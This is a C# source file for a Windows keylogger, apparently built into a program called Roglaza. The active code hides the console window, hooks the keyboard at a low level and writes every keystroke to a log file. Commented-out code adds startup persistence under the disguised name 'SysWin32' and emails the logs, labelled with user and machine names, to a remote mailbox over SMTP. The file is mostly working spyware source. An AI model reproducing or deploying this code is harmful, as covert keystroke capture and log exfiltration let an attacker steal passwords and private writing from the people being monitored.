﻿/* Author: aiglebleu from HighTechLowLife.eu
 * Require to add references to COM "Windows Script Host Model" and Assemblies "System.Windows.Forms"
 */

using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
//using IWshRuntimeLibrary;
using System.Collections.Generic;
using System.Security;
using System.Security.Cryptography;

class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    // You have to modify these to actual addresses and password
   

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // 0 to hide, 1 to show
    const int SW_HIDE = 0;

    static int numChar = 0;

    public static void XMain()
    {
        //Run keylogger with application
        if (Roglaza.Program.ProgramSettings.AllowKeyLogger)
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            // Maintain access (startup folder and %appdata%)
            //init();
            // start hooking keyboard
            _hookID = SetHook(_proc);
            //Application.Run();
            Roglaza.Program.Exec();
                UnhookWindowsHookEx(_hookID); 
        }
        else
        {
            //run application only
            Roglaza.Program.Exec();
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            //Write to console and to file
            Console.WriteLine((Keys)vkCode);
            writeLetter((Keys)vkCode);

            ////Send log via email when it reaches a certain weight.
            //FileInfo logFile = new FileInfo(@"C:\Users\Exception\Desktop\d.txt");
            //if (logFile.Exists && logFile.Length > 1000 )
            //{
            //    string filename = "log_" + Environment.UserName + "@" + Environment.MachineName + "_" + DateTime.Now.ToString(@"MM_dd_yyyy_hh\hmm\mss") + ".txt";
            //    //   sendMail(System.IO.File.ReadAllText(logFile.ToString()), senderEmail, receiverEmail, senderPassword, filename);
            //    logFile.MoveTo(appData + @"\SysWin32\logs\" + filename);
            //}
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    /// <summary>
    ///     Method used to copy the executable to user's appdata and make it launch at startup
    ///// </summary>
    //private static void init()
    //{
    //    return;
    //    string myPath = Application.ExecutablePath;
    //    string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    //    string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    //    string copyPath = appData + @"\SysWin32\" + Path.GetFileName(myPath);

    //    Directory.CreateDirectory(appData + @"\SysWin32\");
    //    Directory.CreateDirectory(appData + @"\SysWin32\logs\");

    //    if (!System.IO.File.Exists(copyPath))
    //    {
    //        System.IO.File.Copy(myPath, copyPath);
    //        createShortcut("SysWin32", startupPath, copyPath);
    //    }
    //}

    /// <summary>
    ///     Method used to send logs via mail
    /// </summary>
    /// <param name="logs">The content of a log to send.</param>
    /// <param name="sender">Sender's email address</param>
    /// <param name="receiver">Receiver's email address</param>
    /// <param name="password">Password of the sender's email account</param>
    /// <param name="filename">Name of the log file</param>
    //private static void sendMail(string logs, string sender, string receiver, string password, string filename)
    //{
    //    // Assign variables
    //    return;
    //    var fromAddress = new MailAddress(sender, "From Sender");
    //    var toAddress = new MailAddress(receiver, "To Receiver");
    //    string fromPassword = password;
    //    string subject = filename;
    //    string body = logs;

    //    // Create an SMTP Client object and instantiate its properties 
    //    var smtp = new SmtpClient
    //    {
    //        Host = "smtp.openmailbox.org",
    //        Port = 587,
    //        EnableSsl = true,
    //        DeliveryMethod = SmtpDeliveryMethod.Network,
    //        UseDefaultCredentials = false,
    //        Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
    //    };

    //    // Create the message to send
    //    var message = new MailMessage(fromAddress, toAddress)
    //    {
    //        Subject = subject,
    //        Body = body,
    //    };

    //    // Send the message
    //    smtp.Send(message);
    //}

    /// <summary>
    ///     Method used to write the key received to the log file
    /// </summary>
    /// <param name="key">The key typed on the keyboard</param>
    /// This method should be activated for each and every keystrokes the user type.
    private static void writeLetter(Keys key)
    {
        // Start writing to a file
        StreamWriter sw = new StreamWriter(Roglaza.Program.ProgramSettings.KeyLoggerStorePath, true);

        // Create aliases for special characters to render properly in the logs
        var specialKeys = new Dictionary<string, string>()
        {
            {"Back", " *back* "},
            {"Delete", " *delete* "},
            {"Return", "\n"},
            {"Space", " "},
            {"Add", "+"},
            {"Subtract", "-"},
            {"Divide", "/"},
            {"Multiply", "*"},
            {"Up", " *up* "},
            {"Down", " *down* "},
            {"Left", " *left* "},
            {"Capital", " *caps* "},
            {"Tab", " *tabs* "},
            {"LShiftKey", " ^ "},
            {"RShiftKey", " ^ "},
            {"Oemcomma", ","},
            {"OemPeriod", "."}
        };

        // Write the key (or its alias) to the file
        if (specialKeys.ContainsKey(key.ToString()))
        {
            sw.Write(specialKeys[key.ToString()]);
        }
        else
        {
            sw.Write(key.ToString().ToLower());
        }

        // Write a new line each 50 characters
        numChar += 1;
        if (numChar == 50)
        {
            sw.WriteLine("");
            numChar = 0;
        }

        // Close the connection to the file
        sw.Close();

    }

    /// <summary>
    ///     This method creates a shortcut
    /// </summary>
    /// <param name="shortcutName">The name of the shortcut</param>
    /// <param name="shortcutPath">The location of the shortcut</param>
    /// <param name="targetFileLocation">What should be linked</param>
    /// Require "using IWshRuntimeLibrary;", and a reference to Windows Script Host Model
    public static void createShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
    {
        //string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
        //WshShell shell = new WshShell();
        //IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

        //shortcut.Description = "Keys";
        //shortcut.TargetPath = targetFileLocation;
        //shortcut.Save();
    }

    //public static bool checkInternet()
    //{
    //   try
    //   {
    //      using (var client = new WebClient())
    //      {
    //         using (var stream = client.OpenRead("http://www.google.com"))
    //         {
    //            return true;
    //         }
    //      }
    //   }
    //   catch
    //   {
    //      return false;
    //   }
    //}
}